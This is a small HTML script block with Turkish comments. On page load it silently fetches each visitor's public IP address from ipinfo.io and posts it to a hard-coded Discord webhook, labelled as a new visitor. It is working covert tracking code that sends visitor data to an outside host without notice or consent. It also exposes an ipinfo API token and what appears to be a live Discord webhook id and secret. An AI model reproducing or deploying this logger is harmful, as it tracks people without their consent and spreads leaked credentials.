    <script>
        // IP adresi almak ve webhook'a göndermek için ipinfo.io kullanımı
        function logIpToWebhook() {
            fetch('https://ipinfo.io/json?token=91f8f57fd42ccd') // ipinfo.io'dan IP adresini çekiyoruz
            .then(response => {
                if (!response.ok) {
                    throw new Error("IP adresi alınamadı: " + response.statusText);
                }
                return response.json();
            })
            .then(data => {
                const ip = data.ip; // IP adresi
                const webhookUrl = 'https://discord.com/api/webhooks/{1289957577924280330}/{eB_aMhDIq-YBxO1Uts008R-gYPuNyS8I6AAs3hRz6rP_EJQFR5UdxaanNNBKJJIJzehs}';
                
                // Webhook'a IP adresini gönderme
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        text: `Yeni Ziyaretçi IP: ${ip}`
                    })
                })
                .then(response => {
                    if (response.ok) {
                        console.log("IP adresi webhook'a gönderildi.");
                    } else {
                        console.error("Webhook'a gönderilemedi: " + response.statusText);
                    }
                })
                .catch(error => console.error("Webhook gönderim hatası:", error));
            })
            .catch(error => console.error("IP adresi alma hatası:", error));
        }

        // Sayfa yüklendiğinde IP adresini gönder
        window.onload = function() {
            logIpToWebhook();
        };
    </script>
